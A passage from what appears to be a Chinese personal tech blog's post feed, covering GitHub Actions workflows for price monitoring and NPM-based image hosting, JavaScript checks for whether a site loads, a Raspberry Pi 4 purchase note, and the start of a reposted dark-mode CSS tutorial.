class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 